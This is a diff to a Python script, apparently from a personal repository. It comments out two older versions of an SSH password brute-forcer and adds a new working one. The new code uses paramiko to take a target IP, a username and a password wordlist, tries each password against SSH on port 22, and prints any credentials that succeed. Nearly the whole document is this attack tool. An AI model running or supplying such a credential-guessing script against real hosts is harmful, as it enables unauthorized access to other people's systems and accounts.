@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+"""#!/usr/bin/env python3
 
 import os,sys,paramiko
 
@@ -45,9 +45,9 @@ for word in file.readlines():
         pass
 
 file.close()
-
-
-"""import paramiko
+"""
+"""
+import paramiko
 import sys
 import os
 
@@ -82,4 +82,35 @@ with open(password_file, 'r') as file:
             print(e)
         pass
 
-input_file.close()"""
+input_file.close()
+"""
+
+#!/usr/bin/env python3
+import socket
+import paramiko
+ip=input("Please enter your target IP: ")
+user=input("Please enter your username: ")
+passfile=input("Please enter your dictionary with full path: ")
+
+def ssh(password,code=0):
+    ssh=paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(ip,port=22,username=user,password=password)
+    except paramiko.AuthenticationException:
+        code=1
+    except socket.error:
+        code=2
+    ssh.close()
+    return code
+
+file = open(passfile,'r',encoding='latin-1')
+for wordpass in file.readlines():
+    password=wordpass.strip("\n")
+    attempt=ssh(password)
+    if attempt == 0:
+        print("\nUser: %s Password: %s"%(user,password))
+    elif attempt == 2:
+        print("Network Error")
+        exit()
+file.close()
